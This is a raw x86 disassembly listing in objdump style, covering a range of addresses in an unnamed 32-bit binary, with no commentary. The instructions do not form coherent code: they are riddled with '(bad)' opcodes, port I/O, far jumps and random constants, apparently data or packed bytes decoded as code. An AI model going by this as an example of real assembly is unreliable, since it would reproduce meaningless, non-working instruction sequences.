  4104e4:	repnz fst DWORD PTR [ebp-0x298a329]
  4104eb:	jg     0x41052c
  4104ed:	adc    dh,0xb4
  4104f0:	sbb    edi,DWORD PTR [edi]
  4104f2:	pushf  
  4104f3:	mov    edi,0x779fb328
  4104f8:	pop    ss
  4104f9:	fild   WORD PTR ds:0x2d47c4a5
  4104ff:	adc    bl,BYTE PTR [edi+0x22dcfd3b]
  410505:	pop    eax
  410506:	nop
  410507:	mov    ah,0x1f
  410509:	out    0x10,al
  41050b:	enter  0x2353,0xe1
  41050f:	lods   al,BYTE PTR ds:[esi]
  410510:	sub    bl,BYTE PTR [edx+ebx*2-0x2b]
  410514:	add    ah,cl
  410516:	(bad)  
  410517:	dec    esp
  410518:	lods   eax,DWORD PTR ds:[esi]
  410519:	fld    QWORD PTR [edi]
  41051b:	push   0xb8ee3b41
  410520:	cdq    
  410521:	(bad)  
  410523:	jge    0x4104cb
  410525:	ds ins DWORD PTR es:[edi],dx
  410527:	sbb    edi,DWORD PTR [edi-0x39]
  41052a:	repnz sub eax,0x481d3fd8
  410530:	loop   0x410500
  410532:	ja     0x4104c3
  410534:	dec    edx
  410535:	fucomip st,st(5)
  410537:	bound  edi,QWORD PTR [edx-0xb]
  41053a:	jg     0x41054c
  41053c:	lahf   
  41053d:	add    esp,esi
  41053f:	xor    BYTE PTR ds:[edx+0x32],bl
  410543:	enter  0xab57,0xfb
  410547:	cmp    BYTE PTR [ebx],ch
  410549:	jmp    0x6035fde1
  41054e:	mov    cl,0xd3
  410550:	mov    ebx,0xebd790ee
  410555:	add    DWORD PTR [esp+eax*8+0x535103b2],0xfa8bf1ec
  410560:	mov    eax,ds:0x858a1bdf
  410565:	sti    
  410566:	adc    al,0x55
  410568:	jmp    0xba0ccf7a
  41056d:	adc    eax,0x63e608a9
  410572:	mov    eax,ds:0x5e5c9bf
  410577:	cmp    edi,DWORD PTR [ebx]
  410579:	fild   WORD PTR [ecx-0x62]
  41057c:	pushf  
  41057d:	xchg   DWORD PTR [ebx+ebp*8-0x15],edx
  410581:	sti    
  410582:	mov    ah,0x7c
  410584:	mov    eax,ds:0x6b80b010
  410589:	(bad)  
  41058b:	fs dec ecx
  41058d:	push   eax
  41058e:	jo     0x4105b2
  410590:	aas    
  410591:	out    0xfc,eax
  410593:	into   
  410594:	adc    ebx,DWORD PTR [edx]
  410596:	ficom  WORD PTR [eax+0x5f]
  410599:	and    eax,0xd7c9be83
  41059e:	test   eax,0x13b263c8
  4105a3:	call   0xead2:0x4ee0d361
  4105aa:	pop    edi
  4105ab:	sub    esp,DWORD PTR [esi-0x5d]
  4105ae:	pop    ss
  4105af:	(bad)  
  4105b0:	cmp    ecx,DWORD PTR [edx-0x35]
  4105b3:	std    
  4105b4:	enter  0xdddf,0xbe
  4105b8:	mov    bl,0xa1
  4105ba:	inc    ecx
  4105bb:	sbb    esi,DWORD PTR [eax+0x7905fd64]
  4105c1:	es dec esp
  4105c3:	mov    cl,BYTE PTR [ebp+0x52995bc9]
  4105c9:	ffreep st(6)
  4105cb:	fcom   QWORD PTR [edx+0x361a76cc]
  4105d1:	nop
  4105d2:	std    
  4105d3:	xchg   esi,eax
  4105d4:	sti    
  4105d5:	sbb    DWORD PTR [edx+0x3e052fcb],eax
  4105db:	(bad)  
  4105dc:	mov    esp,0x68a54748
  4105e1:	and    al,dl
  4105e3:	xchg   DWORD PTR ds:0x6395f2bc,esp
  4105e9:	mov    ah,0x33
  4105eb:	pop    eax
  4105ec:	fwait
  4105ed:	shr    WORD PTR [esi+edx*2],1
  4105f1:	sar    esi,cl
  4105f3:	xchg   ecx,esi
  4105f5:	rol    BYTE PTR [edi],1
  4105f7:	mov    BYTE PTR ds:0x5c88c79,ch
  4105fd:	sar    BYTE PTR [eax+0x10],0x61
  410601:	mov    bh,al
  410603:	mov    edi,0xbd0ccfea
  410608:	xchg   edx,eax
  410609:	nop
  41060a:	inc    bh
  41060c:	mov    ecx,0x5b874a8a
  410611:	push   ecx
  410612:	pop    edi
  410613:	(bad)  
  410614:	jmp    0x41063a
  410616:	fisubr WORD PTR [edx]
  410618:	stos   DWORD PTR es:[edi],eax
  410619:	inc    esi
  41061a:	push   es
  41061b:	iret   
  41061c:	jns    0x4105ee
  41061e:	arpl   WORD PTR [esi+0x481acab2],di
  410624:	daa    
  410625:	and    DWORD PTR [ebx-0x609ef3c0],ecx
  41062b:	(bad)  
  41062c:	in     al,dx
  41062d:	aas    
  41062e:	sbb    DWORD PTR [edx],0xffffffb4
  410631:	xor    BYTE PTR [ebx],dl
  410633:	sbb    esi,DWORD PTR [edi]
  410635:	xchg   esp,eax
  410636:	repnz jecxz 0x41068f
  410639:	test   eax,0x8677ca2f
  41063e:	sahf   
  41063f:	popf   
  410640:	or     edi,DWORD PTR [ecx+0x4e]
  410643:	daa    
  410644:	jmp    0x41063b
  410646:	cmp    DWORD PTR [ebx],ecx
  410648:	mov    bl,0x1a
  41064a:	out    dx,eax
  41064b:	jl     0x410610
  41064d:	jmp    0x8aeb:0xdf3331a8
  410654:	adc    BYTE PTR [esi-0x2102f3e3],dl
  41065a:	in     eax,dx
  41065b:	xchg   ebp,eax
  41065c:	stos   DWORD PTR es:[edi],eax
  41065d:	out    0x47,al
  41065f:	sub    al,0x38
  410661:	push   eax
  410662:	aad    0xc9
  410664:	push   cs
  410665:	(bad)  
  410667:	(bad)  
  410668:	push   dx
  41066a:	sbb    eax,0xfc96c325
  41066f:	cmp    al,0x8
  410671:	fld    DWORD PTR [edx-0x56bf2959]
  410677:	enter  0x30d0,0x56
  41067b:	pusha  
  41067c:	sbb    eax,0xeb194121
  410681:	sbb    eax,0xc59814
  410686:	inc    ebx
  410687:	cmp    al,0x3
  410689:	loopne 0x410648
  41068b:	(bad)  
  41068c:	into   
  41068d:	shl    BYTE PTR [eax-0xc84ce4a],0xdb
  410694:	or     eax,0x9c6794c6
  410699:	xchg   ebp,eax
  41069a:	sub    al,0xb4
  41069c:	jo     0x41067e
  41069e:	in     eax,dx
  41069f:	(bad)  
  4106a0:	mov    ds:0x62bac61a,eax
  4106a5:	jle    0x4106e8
  4106a7:	and    bl,ch
  4106a9:	ret    
  4106aa:	test   BYTE PTR [eax-0x29],dl
  4106ad:	jmp    0x410710
  4106af:	sub    BYTE PTR [ecx],0xea
  4106b2:	ret    
  4106b3:	sbb    DWORD PTR [eax],0xffffffde
  4106b6:	cmc    
  4106b7:	daa    
  4106b8:	arpl   WORD PTR [ecx-0x3f8e0337],sp
  4106be:	cld    
  4106bf:	mov    ds:0x55f9cc61,al
  4106c4:	mov    BYTE PTR [ecx-0x41],bl
  4106c7:	enter  0xbd5a,0xed
  4106cb:	mov    bl,0xdf
  4106cd:	pop    esp
  4106ce:	pop    es
  4106cf:	xchg   esp,eax
  4106d0:	inc    DWORD PTR [ebx-0x22]
  4106d3:	sub    esp,DWORD PTR ds:[ebx+0x4e]
  4106d7:	xor    al,0xe2
  4106d9:	sti    
  4106da:	mov    edi,0xc5db7dc9
  4106df:	or     BYTE PTR [ebp-0x9],ah
  4106e2:	lahf   
  4106e3:	cs mov ah,al
  4106e6:	mov    ah,0x9f
  4106e8:	push   ds
  4106e9:	mov    bh,ah
  4106eb:	and    eax,0x78653d89
  4106f0:	retf   
  4106f1:	outs   dx,DWORD PTR ds:[esi]
  4106f2:	loop   0x410713
  4106f4:	inc    esp
  4106f5:	fbstp  TBYTE PTR [eax-0x15]
  4106f8:	push   0xffffff8e
  4106fa:	ins    BYTE PTR es:[edi],dx
  4106fb:	mov    al,0x73
  4106fd:	lahf   
  4106fe:	cld    
  4106ff:	clc    
  410700:	xor    al,0x29
  410702:	lods   eax,DWORD PTR ds:[esi]
  410703:	xchg   esp,eax
  410704:	push   esp
  410705:	jno    0x410715
  410707:	enter  0xaba2,0xd6
  41070b:	aam    0x6a
  41070d:	or     bh,dl
  41070f:	mov    ebx,0x5e3ed8cf
  410714:	repnz xchg bh,bl
  410717:	inc    edi
  410718:	mov    eax,ds:0xcae462ac
  41071d:	shl    DWORD PTR [ecx-0x4620f7a0],cl
  410723:	sub    BYTE PTR [ebx+0x46],bh
  410726:	aad    0x88
  410728:	outs   dx,BYTE PTR ds:[esi]
  410729:	int3   
  41072a:	fidivr DWORD PTR [esi-0x72]
  41072d:	pop    ebp
  41072e:	std    
  41072f:	sti    
  410730:	stos   DWORD PTR es:[edi],eax
  410731:	shld   DWORD PTR [edi-0x9a1f612],edi,0xeb
  410739:	and    bh,BYTE PTR [eax+edx*4-0x793cabb9]
  410740:	jmp    0x4106e4
  410742:	mul    ch
  410744:	push   cs
  410745:	cwde   
  410746:	loopne 0x4106e6
  410748:	push   ebp
  410749:	fild   QWORD PTR [esi+0x72]
  41074c:	push   ss
  41074d:	lods   eax,DWORD PTR ds:[esi]
  41074e:	and    ah,BYTE PTR [ecx]
  410750:	dec    edx
  410752:	cld    
  410753:	push   edx
  410754:	or     esi,edx
  410756:	xlat   BYTE PTR ds:[ebx]
  410757:	xchg   edx,eax
  410758:	sbb    ch,al
  41075a:	rol    edi,cl
  41075c:	or     edi,DWORD PTR [ebx+0x18d4202c]
  410762:	adc    dh,cl
  410764:	call   0x8da2d0e
  410769:	in     eax,dx
  41076a:	js     0x4107c9
  41076c:	push   0xe
  41076e:	add    eax,0x84b79dc8
  410773:	cld    
  410774:	iret   
  410775:	xor    al,0x94
  410777:	jo     0x410761
  410779:	sar    DWORD PTR ds:0x1f7b68b,1
  41077f:	dec    esp
  410780:	stos   DWORD PTR es:[edi],eax
  410781:	sub    dh,BYTE PTR [edx]
  410783:	xor    al,0xf1
  410785:	std    
  410786:	stos   BYTE PTR es:[edi],al
  410787:	leave  
  410788:	or     al,0x48
  41078a:	fldcw  WORD PTR [ecx-0x41]
  41078d:	dec    ebp
  41078e:	rcr    DWORD PTR [ecx-0x23d5cc3b],0xeb
  410795:	loopne 0x410767
  410797:	stc    
  410798:	outs   dx,BYTE PTR ds:[esi]
  410799:	mov    al,ds:0xd9b96cbd
  41079e:	retf   
  41079f:	mov    esp,0x375d041b
  4107a4:	ficomp WORD PTR [edi+0x73a253bf]
  4107aa:	std    
  4107ab:	sub    ch,BYTE PTR [edx+0x59672865]
  4107b1:	call   0x827a:0xdf13225a
  4107b8:	repnz cld 
  4107ba:	mov    esi,0x2dd7b255
  4107bf:	aam    0x19
  4107c1:	and    eax,DWORD PTR [esi+edi*2]
  4107c4:	call   0x7702:0x12f5bd7e
  4107cb:	and    bh,bh
  4107cd:	(bad)  
  4107cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107d0:	pop    edi
  4107d1:	push   es
  4107d2:	cmp    al,0xc0
  4107d4:	pop    ebx
  4107d5:	fld    QWORD PTR [edx]
  4107d7:	data16 addr16 jo 0x410859
  4107db:	aas    
  4107dc:	jnp    0x4107ab
  4107de:	inc    ecx
  4107df:	fadd   QWORD PTR [ebx+0x7a]
  4107e2:	out    dx,al
  4107e3:	(bad)  
  4107e4:	mov    DWORD PTR ds:0xedb67b86,ebp
  4107ea:	add    BYTE PTR [ebx],bh
  4107ec:	jmp    0x410853
  4107ee:	pop    edx
  4107ef:	and    al,0xc8
  4107f1:	dec    edi
  4107f2:	add    dh,BYTE PTR [esi+0x3a4ddf12]
  4107f8:	add    BYTE PTR [eax-0x72],0x56
  4107fc:	xchg   edx,eax
  4107fd:	shld   edi,edx,cl
  410800:	jmp    0x41078d
  410802:	sub    BYTE PTR [ebp-0x2],bl
  410805:	addr16 mov edx,0xb5440c7f
  41080b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41080c:	out    0x1,al
  41080e:	adc    ecx,ebx
  410810:	nop
  410811:	(bad)  
  410813:	add    ebx,DWORD PTR [esp+ecx*4-0x2e]
  410817:	data16 jmp 0x4107c0
  41081a:	cmp    eax,0xcd470370
  41081f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410820:	push   esp
  410821:	fist   WORD PTR [ecx]
  410823:	aam    0x1b
  410825:	sub    ebx,DWORD PTR [eax-0x3040d4c]
  41082b:	sub    al,0x52
  41082d:	loopne 0x410853
  41082f:	dec    esi
  410830:	out    dx,eax
  410831:	cmp    al,0x4b
  410833:	enter  0xec92,0xa5
  410837:	sbb    ebp,DWORD PTR [edi+ebx*1-0x4d]
  41083b:	inc    esp
  41083c:	pop    ss
  41083d:	xchg   ebp,eax
  41083e:	cld    
  41083f:	outs   dx,BYTE PTR ds:[esi]
  410840:	adc    DWORD PTR [edx+0x1407463e],0x15cec7df
  41084a:	and    eax,0x8cc0d967
  41084f:	mov    dl,0xeb
  410851:	cwde   
  410852:	adc    eax,0xc0d3ab4d
  410857:	pop    edi
  410858:	in     eax,dx
  410859:	(bad)  
  41085b:	sub    al,0x64
  41085d:	and    BYTE PTR [ebx-0x25a584d],ah
  410863:	dec    esi
  410864:	ins    BYTE PTR es:[edi],dx
  410865:	adc    DWORD PTR [ecx-0x46901daa],esp
  41086b:	mov    ebx,0x6339dfb0
  410870:	cs leave 
  410872:	sub    DWORD PTR [eax+0x23fe0fac],ebx
  410878:	inc    ebx
  410879:	add    cl,bl
  41087b:	dec    eax
  41087c:	test   esi,ebx
  41087e:	mov    al,ds:0xfa7c034
  410883:	leave  
  410884:	jmp    0x24871e35
  410889:	(bad)  
  41088a:	pushf  
  41088b:	add    DWORD PTR [esi-0x60],ebx
  41088e:	cld    
  41088f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410890:	and    bh,bh
  410892:	and    BYTE PTR [ecx],dh
  410894:	outs   dx,BYTE PTR ds:[esi]
  410895:	lods   eax,DWORD PTR ds:[esi]
  410896:	dec    ebp
  410897:	enter  0x6754,0x20
  41089b:	xor    bl,BYTE PTR [esi-0x1425ed28]
  4108a1:	mov    ebp,0xd4cf6c36
  4108a6:	retf   
  4108a7:	cmp    ebx,edx
  4108a9:	fbld   TBYTE PTR [ecx+0x5b]
  4108ac:	in     eax,dx
  4108ad:	sub    edx,DWORD PTR [ebp-0x3131d08]
  4108b3:	push   ss
  4108b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108b5:	jl     0x4108ca
  4108b7:	xchg   edx,eax
  4108b8:	xchg   BYTE PTR [esi],al
  4108ba:	dec    ecx
  4108bb:	enter  0x29f9,0xec
  4108bf:	pop    edx
  4108c0:	rcr    DWORD PTR [edx-0x671450b3],1
  4108c6:	cdq    
  4108c7:	mov    ds:0x305a6f61,al
  4108cc:	and    eax,0x8babdab0
  4108d2:	fwait
  4108d3:	enter  0xd086,0x82
  4108d7:	fsubr  st,st(3)
  4108d9:	xchg   ebx,eax
  4108da:	call   0xdce6d673
  4108df:	mov    esi,0x752fdf4e
  4108e4:	push   esi
  4108e5:	or     eax,0x2d31135c
  4108ea:	std    
  4108eb:	xor    BYTE PTR [ebp+0x28],cl
  4108ee:	mov    dl,0x47
  4108f0:	das    
  4108f1:	adc    edi,esp
  4108f3:	(bad)  
  4108f4:	mov    ch,0xc1
  4108f6:	add    al,0xf1
  4108f8:	popf   
  4108f9:	mov    bl,0xb3
  4108fb:	clc    
  4108fc:	jmp    0x410975
  4108fe:	pop    ds
  4108ff:	push   cs
  410900:	mov    edx,0xb6aaf10a
  410905:	add    eax,0x6c6b16da
  41090a:	lds    esi,FWORD PTR [ebx+0x12]
  41090d:	rcl    DWORD PTR [eax+0x10],0x98
  410911:	sar    esp,cl
  410913:	mov    dl,BYTE PTR [eax-0x74c7367f]
  410919:	icebp  
  41091a:	retf   
  41091b:	enter  0x21f8,0xea
  41091f:	std    
  410920:	lods   al,BYTE PTR ds:[esi]
  410921:	cmp    esi,DWORD PTR [eax+0x7]
  410924:	sahf   
  410925:	sub    ch,bh
  410927:	lock xchg esp,eax
  410929:	or     DWORD PTR [eax+0x21],ebx
  41092c:	cld    
  41092d:	add    ch,BYTE PTR [edi]
  41092f:	mov    edi,0x47f4504e
  410934:	leave  
  410935:	cdq    
  410936:	push   0xfcea9afd
  41093b:	outs   dx,DWORD PTR ds:[esi]
  41093c:	cmp    eax,0xd06b3cd1
  410941:	add    al,0xa9
  410943:	and    al,0x3b
  410945:	fbstp  TBYTE PTR [edi]
  410947:	in     al,dx
  410948:	fnstenv [esi+ebx*1-0x2c249ae]
  41094f:	lods   eax,DWORD PTR ds:[esi]
  410950:	scas   eax,DWORD PTR es:[edi]
  410951:	lahf   
  410952:	adc    ebx,DWORD PTR [edi+0x59]
  410955:	frstor [edx-0x441ae138]
  41095b:	je     0x4109c8
  41095d:	retf   0x72de
  410960:	mul    BYTE PTR [esi+0x51]
  410963:	(bad)  
  410964:	jmp    0x410930
  410966:	xchg   edx,eax
  410967:	mov    ch,0xf3
  410969:	jl     0x4109e6
  41096b:	enter  0x96d1,0x9e
  41096f:	pop    edi
  410970:	les    ecx,FWORD PTR [eax+eax*8+0x5e]
  410974:	in     al,dx
  410975:	pop    es
  410976:	(bad)  
  410977:	not    DWORD PTR [esp+eax*2]
  41097a:	mov    dl,0x3a
  41097c:	and    ecx,DWORD PTR [ebp-0x68d33776]
  410982:	mov    esi,0x25b754e5
  410987:	xor    al,0xeb
  410989:	adc    al,0xc2
  41098b:	push   es
  41098c:	leave  
  41098d:	outs   dx,DWORD PTR ds:[esi]
  41098e:	ja     0x41098b
  410990:	daa    
  410991:	fist   WORD PTR [ebx-0x34]
  410994:	mov    ds:0xbb964ed6,al
  410999:	loop   0x410981
  41099b:	mov    ah,BYTE PTR [esi-0x21]
  41099e:	fwait
  41099f:	xor    eax,0x3e4e8204
  4109a4:	je     0x410985
  4109a6:	test   BYTE PTR [ebp-0x1f],dl
  4109a9:	stos   DWORD PTR es:[edi],eax
  4109aa:	mov    ds:0xfca5b0db,al
  4109af:	lock push es
  4109b1:	shr    BYTE PTR [eax],cl
  4109b3:	loopne 0x4109c1
  4109b5:	mov    bh,dl
  4109b7:	(bad)  
  4109b8:	and    ah,dh
  4109ba:	add    edx,DWORD PTR [edi]
  4109bc:	pop    ds
  4109bd:	push   ebp
  4109be:	jl     0x4109a6
  4109c0:	pushf  
  4109c1:	fld    DWORD PTR [ecx]
  4109c3:	sub    ebx,DWORD PTR [eax-0x50]
  4109c6:	mov    esp,0x60642306
  4109cb:	dec    esp
  4109cc:	or     al,ah
  4109ce:	mov    fs,WORD PTR [ecx+0x5d]
  4109d1:	dec    ebp
  4109d2:	fsub   DWORD PTR [edi]
  4109d4:	add    eax,0xebb044e1
  4109d9:	fmul   DWORD PTR [edi+0x4a5941de]
  4109df:	in     eax,dx
  4109e0:	sbb    bh,0xdf
  4109e3:	adc    esp,eax
  4109e5:	dec    esi
  4109e6:	stos   BYTE PTR es:[edi],al
  4109e7:	sbb    al,BYTE PTR [esi+ebx*8]
  4109ea:	sub    al,ah
  4109ec:	in     eax,dx
  4109ed:	mov    BYTE PTR [edx-0x66],dh
  4109f0:	inc    esp
  4109f1:	lahf   
  4109f2:	mov    edi,ss
  4109f4:	stos   DWORD PTR es:[edi],eax
  4109f5:	in     al,0xbb
  4109f7:	fst    QWORD PTR [esi+esi*8-0x4]
  4109fb:	adc    DWORD PTR [ecx-0x4],ebp
  4109fe:	and    eax,0xf7ed061b
  410a03:	sti    
  410a04:	or     ch,dh
  410a06:	push   0xffffffc8
  410a08:	lods   eax,DWORD PTR ds:[esi]
  410a09:	push   cs
  410a0a:	inc    esp
  410a0b:	mov    DWORD PTR [eax+eiz*8],eax
  410a0e:	jno    0x4109d3
  410a10:	xor    al,0xc4
  410a12:	mov    ah,0xa5
  410a14:	test   DWORD PTR [ebp-0x4a6b92fd],edi
  410a1a:	jl     0x410a66
  410a1c:	mov    cl,0x37
  410a1e:	cmp    BYTE PTR [edi-0x4b],ch
  410a21:	fild   WORD PTR [esi+ecx*8+0x67e3ee4f]
  410a28:	inc    edi
  410a29:	es std 
  410a2b:	imul   eax,DWORD PTR [edx+0x75],0x9b3d2b19
  410a32:	inc    ebp
  410a33:	enter  0x17a4,0x14
  410a37:	pop    eax
  410a38:	mov    ecx,0xeb560bff
  410a3d:	rol    DWORD PTR [ecx+0x1f],cl
  410a40:	and    dl,bh
  410a42:	cdq    
  410a43:	(bad)
  410a48:	inc    eax
  410a49:	mov    cl,0x2c
  410a4b:	loopne 0x410a42
  410a4d:	dec    ebx
  410a4e:	dec    eax
  410a4f:	stos   DWORD PTR es:[edi],eax
  410a50:	jmp    0x410a69
  410a52:	into   
  410a53:	and    bh,bl
  410a55:	mov    edi,0xebced59a
  410a5a:	mov    BYTE PTR [esi-0x4f],bl
  410a5d:	cdq    
  410a5e:	outs   dx,BYTE PTR ds:[esi]
  410a5f:	or     DWORD PTR [esi],eax
  410a61:	jo     0x410a51
  410a63:	inc    edi
  410a64:	out    0xa0,al
  410a66:	push   edx
  410a67:	inc    edi
  410a68:	jmp    0x410a68
  410a6a:	and    edi,DWORD PTR [eax+0x78]
  410a6d:	jp     0x410aa7
  410a6f:	sbb    al,0xa3
  410a71:	loopne 0x410a48
  410a73:	mov    edi,?
  410a75:	xor    ebp,DWORD PTR [ebx]
  410a77:	js     0x410a76
  410a79:	adc    ecx,DWORD PTR [edi]
  410a7b:	inc    edx
  410a7c:	call   0x397e:0x77edfd30
  410a83:	xchg   esp,eax
  410a84:	mul    DWORD PTR [esp+edi*1]
  410a87:	enter  0x312b,0x4a
  410a8b:	or     eax,ebx
  410a8d:	fsub   st(7),st
  410a8f:	data16 jmp 0x410a5f
  410a92:	xor    al,0x88
  410a94:	jb     0x410a33
  410a96:	aam    0x44
  410a98:	and    al,0x67
  410a9a:	adc    al,0xc7
  410a9c:	inc    ebp
  410a9d:	(bad)  
  410a9e:	pop    esp
  410a9f:	push   ebp
  410aa0:	inc    BYTE PTR [eax]
  410aa2:	push   ebx
  410aa3:	cwde   
  410aa4:	bound  esp,QWORD PTR [ebx]
  410aa6:	jle    0x410ac7
  410aa8:	jmp    0x410a8a
  410aaa:	sub    esp,0xb
  410aad:	dec    edx
  410aae:	pop    edx
  410aaf:	xchg   eax,esp
  410ab1:	jmp    0x750d:0x2000d224
  410ab8:	jmp    0x7f0:0xeb309379
  410abf:	(bad)  
  410ac0:	imul   BYTE PTR ds:[esp+esi*8+0x47]
  410ac5:	fdiv   QWORD PTR [ecx-0x7d0c7e7e]
  410acb:	pushf  
  410acc:	push   ebx
  410acd:	mov    ds:0x55ffe79d,al
  410ad2:	mov    WORD PTR [esi-0xd7bce15],ds
  410ad8:	cdq    
  410ad9:	inc    edi
  410ada:	inc    edx
  410adb:	push   ds
  410adc:	outs   dx,BYTE PTR ds:[esi]
  410add:	fmul   QWORD PTR [ebp-0x63e65fbe]
  410ae3:	mov    edi,DWORD PTR [esi-0x1]
  410ae6:	sbb    edi,edx
  410ae8:	pop    ebx
  410ae9:	dec    ecx
  410aea:	(bad)  
  410aeb:	fs pop eax
  410aed:	inc    edi
  410aee:	pusha  
  410aef:	std    
  410af0:	jg     0x410aa9
  410af2:	int3   
  410af3:	and    eax,0xc489e0f3
  410af8:	xor    ah,ah
  410afa:	or     bl,BYTE PTR [eax]
  410afc:	and    BYTE PTR [esi],ah
  410afe:	xor    dh,al
  410b00:	jmp    0x410ab1
  410b02:	shl    ebp,cl
  410b04:	or     al,0x13
  410b06:	cmp    al,0x3f
  410b08:	jo     0x410ad2
  410b0a:	lahf   
  410b0b:	enter  0x8817,0x1d
  410b0f:	mov    DWORD PTR cs:[ecx],0xb1a30652
  410b16:	cld    
  410b17:	imul   eax,DWORD PTR [edx-0x53c3b770],0x4ec873d4
  410b21:	xchg   ebx,eax
  410b22:	repnz mov DWORD PTR [esi-0x4c],esi
  410b26:	outs   dx,DWORD PTR ds:[esi]
  410b27:	loope  0x410b14
  410b29:	xor    BYTE PTR [ebx+0x49322853],ch
  410b2f:	outs   dx,BYTE PTR ds:[esi]
  410b30:	sub    bl,bh
  410b32:	push   ebp
  410b33:	mov    al,ds:0x2f18dfb
  410b38:	push   ss
  410b39:	enter  0xf7fc,0xab
  410b3d:	mov    ecx,0x4df895bb
  410b42:	aaa    
  410b43:	enter  0x2a6a,0x68
  410b47:	adc    DWORD PTR [edx+ebp*4+0x4a],0xffffffaf
  410b4c:	jmp    0x410b03
  410b4e:	loopne 0x410b37
  410b50:	or     BYTE PTR [edi+ebp*8+0x19],bh
  410b54:	dec    esi
  410b55:	or     BYTE PTR [eax-0x62],dl
  410b58:	imul   esi,DWORD PTR ds:0x5ef6a09c,0x4a
  410b5f:	inc    esp
  410b60:	jmp    0x410bb4
  410b62:	mov    al,ds:0xd3005ab0
  410b67:	dec    ebp
  410b68:	in     eax,0xdf
  410b6a:	push   ds
  410b6b:	mov    eax,0x767282d8
  410b70:	neg    ah
  410b72:	sub    al,BYTE PTR [ebx+ebp*8-0x8]
  410b76:	add    DWORD PTR [ebp+edi*4+0x4f1ff714],0x6cd4410b
  410b81:	mov    bh,BYTE PTR [ebx]
  410b83:	cmp    bh,BYTE PTR cs:[edi-0x7e90038f]
  410b8a:	std    
  410b8b:	cmc    
  410b8c:	add    eax,0xc789d0aa
  410b91:	cmc    
  410b92:	or     cl,0xfd
  410b95:	(bad)  
  410b96:	ja     0x410b72
  410b98:	out    dx,al
  410b99:	mov    ss,WORD PTR [eax+0xb0c4108]
  410b9f:	jl     0x410ba5
  410ba1:	mov    cl,0xff
  410ba3:	cmp    DWORD PTR [esi+0x18705313],esp
  410ba9:	sbb    DWORD PTR [ebx-0x59],esp
  410bac:	lods   al,BYTE PTR ds:[esi]
  410bad:	jno    0x410b82
  410baf:	pop    ss
  410bb0:	out    dx,eax
  410bb1:	pop    ss
  410bb2:	imul   esp,DWORD PTR [ebx],0xa2e491e3
  410bb8:	jmp    0x410c39
  410bba:	aad    0x97
  410bbc:	inc    edi
  410bbd:	adc    esi,DWORD PTR [ecx-0x75208383]
  410bc3:	mov    esp,0x483fb13d
  410bc8:	sbb    BYTE PTR [ebp+edi*8+0x57],al
  410bcc:	mov    al,ds:0x98d45c7b
  410bd1:	or     dh,BYTE PTR [ebx-0x288a6d38]
  410bd7:	(bad)
  410bda:	dec    ebx
  410bdb:	and    eax,0xe2810be6
  410be0:	ror    BYTE PTR [esi],0x6d
  410be3:	ret    0xe607
  410be6:	mov    ecx,0xc92f73c8
  410beb:	sti    
  410bec:	dec    ebp
  410bed:	push   ecx
  410bee:	lahf   
  410bef:	inc    esi
  410bf0:	xchg   edi,eax
  410bf1:	sub    edi,ebp
  410bf3:	and    ebp,esi
  410bf5:	fstp   st(4)
  410bf7:	daa    
  410bf8:	sahf   
  410bf9:	call   0x9bb:0xb7a6c7f6
  410c00:	in     eax,0xb1
  410c02:	sbb    BYTE PTR [ebx-0x1c],cl
  410c05:	fadd   DWORD PTR [ebx-0xe115438]
  410c0b:	sahf   
  410c0c:	jp     0x410c14
  410c0e:	push   eax
  410c0f:	enter  0xfd1f,0xad
  410c13:	mov    dh,0x81
  410c15:	cmp    BYTE PTR [ebx-0x77],dl
  410c18:	(bad)  
  410c19:	xchg   edi,eax
  410c1a:	out    dx,eax
  410c1b:	sub    ebx,ebp
  410c1d:	sub    BYTE PTR [edi],dl
  410c1f:	adc    ch,al
  410c21:	push   0xc2f39730
  410c26:	test   esi,ebp
  410c28:	mov    al,0x1f
  410c2a:	push   ebx
  410c2b:	adc    BYTE PTR [edi],dh
  410c2d:	mov    ebp,0xb0c4c6fc
  410c32:	mov    edx,0x3c8d1082
  410c37:	enter  0xd892,0x37
  410c3b:	ss pop esi
  410c3d:	sahf   
  410c3e:	cmp    dl,al
  410c40:	jmp    0x410be4
  410c42:	in     eax,dx
  410c43:	xor    DWORD PTR [edi],0x8
  410c46:	jge    0x410c4f
  410c48:	imul   ebx,esi,0x1161f0ee
  410c4e:	stos   BYTE PTR es:[edi],al
  410c4f:	adc    DWORD PTR [ebx-0x148d5ee5],ebx
  410c55:	jns    0x410cc5
  410c57:	and    ebp,ebp
  410c59:	add    BYTE PTR [edx+ecx*2+0x6786df71],bl
  410c60:	jl     0x410c37
  410c62:	jge    0x410cac
  410c64:	pop    ds
  410c65:	mov    eax,ds:0xeaeb30a4
  410c6a:	add    BYTE PTR [eax],ch
  410c6c:	out    dx,eax
  410c6d:	sbb    DWORD PTR [edi-0xb],eax
  410c70:	sbb    al,0xd1
  410c72:	nop
  410c73:	enter  0xb7e,0x43
  410c77:	pop    esp
  410c78:	adc    eax,0xebd8f652
  410c7d:	push   es
  410c7e:	in     al,0x66
  410c80:	dec    eax
  410c81:	adc    al,0x1f
  410c83:	or     eax,0x1475df84
  410c88:	mov    ds:0xa1b04d67,al
  410c8d:	outs   dx,BYTE PTR ds:[esi]
  410c8e:	cld    
  410c8f:	dec    eax
  410c90:	mov    cl,0xea
  410c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c93:	jns    0x410c40
  410c95:	and    DWORD PTR [esi+0x6df192b],0xc7fb95fc
  410c9f:	mov    cl,bl
  410ca1:	call   0x1c94:0x689690fc
  410ca8:	inc    edi
  410ca9:	cwde   
  410caa:	call   0x52d3:0x401ff08e
  410cb1:	(bad)  
  410cb2:	and    DWORD PTR [ebx],ebp
  410cb4:	in     al,dx
  410cb5:	sbb    BYTE PTR [eiz*1-0x9fc6439],ah
  410cbc:	das    
  410cbd:	push   esp
  410cbe:	test   bh,al
  410cc0:	cmp    esp,edi
  410cc2:	(bad)  
  410cc3:	inc    DWORD PTR [edx-0x46bf03b1]
  410cc9:	fdivr  st,st(4)
  410ccb:	cdq    
  410ccc:	mov    ds:0xd2b5d241,al
  410cd1:	or     BYTE PTR [edi+eax*8-0x4b],0x38
  410cd6:	mov    edx,0xc3dff69b
  410cdb:	mov    eax,0x14fd30cc
  410ce0:	and    ebx,DWORD PTR [esi+edi*4-0x1f]
  410ce4:	inc    esp
